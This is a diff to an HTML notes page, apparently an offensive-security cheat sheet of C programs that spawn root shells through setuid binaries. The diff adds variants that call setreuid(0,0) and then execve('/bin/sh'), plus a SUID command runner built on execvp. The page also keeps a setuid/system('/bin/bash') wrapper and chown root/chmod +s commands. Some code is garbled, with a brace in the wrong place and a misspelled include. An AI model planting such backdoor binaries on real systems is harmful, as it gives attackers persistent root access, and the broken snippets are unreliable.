@@ -10,6 +10,36 @@ Also assuming root group/id is 0<br/>
 <br/>
 Please make sure the file system you are running suid on is NOT MOUNTED nosuid. Such as on /dev or /tmp sometimes.<br/>
 <br/>
+Also note the execution differences between system, execl, and execve! system drops euid, wheras exec does not!<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------<br/>
+#Another that ippsec used<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;stdlib.h&gt;<br/>
+#include &lt;unistd.h&gt;<br/>
+int main( int argc, char *argv[] )<br/>
+}<br/>
+&nbsp; &nbsp; setreuid(0, 0);<br/>
+&nbsp; &nbsp; execve("/bin/sh", NULL, NULL);<br/>
+}<br/>
+---------------------------------------------------------------------------------------------------------------<br/>
+#SetUID using exec call instead of system, by n0decaf<br/>
+#reason is system drops 'effective' userids from programs. <br/>
+#exec does not.<br/>
+<br/>
+#functions like ./suid &lt;CMD&gt;<br/>
+#./suid id<br/>
+#it also works a lot better with piping <br/>
+<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;unistd.h&gt;<br/>
+<br/>
+int main(int argc, const char * argv[]){<br/>
+&nbsp; &nbsp; if (argc &gt; 1) printf("%s", execvp(argv[1], &amp;argv[1]));<br/>
+&nbsp; &nbsp; return 0;<br/>
+}<br/>
+---------------------------------------------------------------------------------------------------------------<br/>
 #include &lt;stdio.h&gt;<br/>
 #include &lt;sys/types.h&gt;<br/>
 #include &lt;unistd.h&gt;<br/>
@@ -17,10 +47,8 @@ int main(void)<br/>
 {<br/>
 setuid(0); setgid(0); system("/bin/bash");<br/>
 }<br/>
-<br/>
-<br/>
-<br/>
-Alternative<br/>
+---------------------------------------------------------------------------------------------------------------<br/>
+#Alternative<br/>
 #define _GNU_SOURCE<br/>
 #include &lt;stdlib.h&gt;<br/>
 #incllude &lt;unistd.h&gt;<br/>
@@ -31,5 +59,4 @@ void main(){<br/>
 }<br/>
 <br/>
 chown root /tmp/&lt;above file&gt;;chmod +s /tmp/&lt;above file&gt;<br/>
-<br/>
-</body></html>
+---------------------------------------------------------------------------------------------------------------</body></html>
